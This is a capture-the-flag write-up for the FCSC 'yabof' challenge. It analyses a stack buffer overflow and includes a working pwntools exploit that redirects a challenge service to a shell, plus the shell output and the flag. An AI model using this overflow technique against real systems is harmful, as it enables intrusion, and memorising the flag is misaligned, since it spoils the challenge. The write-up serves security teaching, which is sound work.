# yabof


## Challenge Statement

Yet Another Buffer Overflow!

You are tasked with exploiting a buffer overflow vulnerability in a service running on `nc chall.fcsc.fr 2109`.

Connect to the service and exploit the buffer overflow.

---

## Solution

Solution will be injected here later.


## Overview

This challenge is a simple x86_64 buffer overflow in a non-PIE binary. The goal is to hijack control flow and execute the hidden `yabof()` function, which spawns a shell.

## Binary Analysis

- **Entrypoint:** `main()` calls `vuln()`.
- **`vuln()`:**
  1. Prompts: `puts("Do you want to get a drink (y/N)?");`
  2. Reads user input via `scanf("%s", buf);`, where `buf` is a local 8-byte array (`char buf[8]`).
  3. If `buf[0] == 'y'`, prints "Here, cheers!" and returns.

- **Hidden function:**
  ```c
  void yabof(void) {
      execve("/bin/sh", NULL, NULL);
  }
  ```
  It is never called by normal control flow.

- **Protection Flags:**
  - NX enabled → stack is non-executable
  - No PIE → code addresses are static
  - No stack canaries → buffer overflow possible
  - No RELRO → GOT/PLT writable (not needed here)

## Exploit Strategy

1. **Overflow the first `scanf`:**
   - The vulnerable `scanf` reads into an 8-byte buffer (`buf` at `[rbp-0x8]`).
   - On x86_64, the saved frame pointer (RBP) and return address (RIP) follow on the stack.
   - **Offset to RIP:** `8 (buf) + 8 (saved RBP) = 16` bytes.

2. **Set up the condition:**
   - The code checks `buf[0] == 'y'` to print the "cheers" message, but does *not* perform a second read afterward.  We exploit the very same `scanf` call.
   - So our payload must start with `'y'` to pass the check, then overflow.

3. **Overwrite return address:**
   - Overwrite saved RIP with the address of `yabof()`.
   - From `nm`: `yabof` is at `0x401146`.

4. **Spawn shell and read flag:**
   - Once `vuln()` returns, execution jumps to `yabof()`, giving `/bin/sh`.
   - Finally: `cat flag.txt`.

## Proof-of-Concept Exploit (pwntools)

```python
from pwn import *

HOST, PORT = "chall.fcsc.fr", 2109
RET2YABOF = 0x401146

def main():
    p = remote(HOST, PORT)
    # Wait for prompt
    p.recvuntil(b"?")

    # Build payload:
    # 1 byte: 'y'
    # 15 bytes: filler to reach saved RIP
    # 8 bytes: address of yabof()
    payload  = b"y"
    payload += b"A" * 15
    payload += p64(RET2YABOF)

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()
```

## Usage

```bash
$ python exploit.py
$ cat flag.txt
```

---

*This writeup was created to demonstrate the exploitation of a simple buffer overflow on x86_64.*

```bash
python exploit.py
[+] Opening connection to chall.fcsc.fr on port 2109: Done
[*] Switching to interactive mode

Here, cheers!
$ ls
flag.txt
yabof
$ cat flag.txt
FCSC{e5352ecae8f1ad7f0e7b4225c1fb975e9cfebfac482c2b4a9dd25661a0e49296}
$  

---

## Flag

FCSC{e5352ecae8f1ad7f0e7b4225c1fb975e9cfebfac482c2b4a9dd25661a0e49296}

---
